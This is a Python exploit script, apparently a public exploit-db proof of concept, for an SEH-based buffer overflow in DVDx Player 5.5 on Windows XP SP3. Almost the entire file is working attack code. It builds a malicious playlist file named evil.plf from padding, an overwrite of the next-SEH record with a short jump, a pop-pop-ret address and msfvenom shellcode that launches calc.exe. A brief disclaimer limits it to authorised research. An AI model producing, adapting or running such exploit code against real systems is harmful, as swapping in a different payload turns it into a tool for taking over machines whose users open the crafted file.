'''
	Exploit Scripter: Abhilash Nigam
	Vulnerable Software: DVDx Player - 5.5 
		Available Here: https://www.exploit-db.com/apps/cdfda7217304f4deb7d2e8feb5696394-DVDXPlayerSetup.exe
	Payload: windows/exec CMD=calc.exe
	System Info: Windows XP SP3

	Disclaimer: PLEASE! This is for research purposes only, and should only be used on authorized systems.
				Accessing a computer system or network without authorization or explicit permission is illegal.
'''

  
filename="evil.plf"
 
#msfvenom -p windows/exec CMD=calc.exe -f python -b '\x00\x0a\x0d\x1a' 
buf =  b""
buf += b"\xba\xf4\x9e\xe3\x82\xda\xcb\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x31\x31\x55\x13\x83\xed\xfc\x03\x55\xfb\x7c"
buf += b"\x16\x7e\xeb\x03\xd9\x7f\xeb\x63\x53\x9a\xda\xa3\x07"
buf += b"\xee\x4c\x14\x43\xa2\x60\xdf\x01\x57\xf3\xad\x8d\x58"
buf += b"\xb4\x18\xe8\x57\x45\x30\xc8\xf6\xc5\x4b\x1d\xd9\xf4"
buf += b"\x83\x50\x18\x31\xf9\x99\x48\xea\x75\x0f\x7d\x9f\xc0"
buf += b"\x8c\xf6\xd3\xc5\x94\xeb\xa3\xe4\xb5\xbd\xb8\xbe\x15"
buf += b"\x3f\x6d\xcb\x1f\x27\x72\xf6\xd6\xdc\x40\x8c\xe8\x34"
buf += b"\x99\x6d\x46\x79\x16\x9c\x96\xbd\x90\x7f\xed\xb7\xe3"
buf += b"\x02\xf6\x03\x9e\xd8\x73\x90\x38\xaa\x24\x7c\xb9\x7f"
buf += b"\xb2\xf7\xb5\x34\xb0\x50\xd9\xcb\x15\xeb\xe5\x40\x98"
buf += b"\x3c\x6c\x12\xbf\x98\x35\xc0\xde\xb9\x93\xa7\xdf\xda"
buf += b"\x7c\x17\x7a\x90\x90\x4c\xf7\xfb\xfe\x93\x85\x81\x4c"
buf += b"\x93\x95\x89\xe0\xfc\xa4\x02\x6f\x7a\x39\xc1\xd4\x74"
buf += b"\x73\x48\x7c\x1d\xda\x18\x3d\x40\xdd\xf6\x01\x7d\x5e"
buf += b"\xf3\xf9\x7a\x7e\x76\xfc\xc7\x38\x6a\x8c\x58\xad\x8c"
buf += b"\x23\x58\xe4\xee\xa2\xca\x64\xdf\x41\x6b\x0e\x1f"



buffer = "A" * 608

buffer += "\xEB\x06\x90\x90"		#overwriting the next SEH Record Address with jmp short 0x06
buffer += "\x8B\x46\x03\x64" 		#overwriting the SEH Handler Address with pop pop ret sequence

buffer += buf
buffer += "D" * (2000 - len(buffer))

textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()



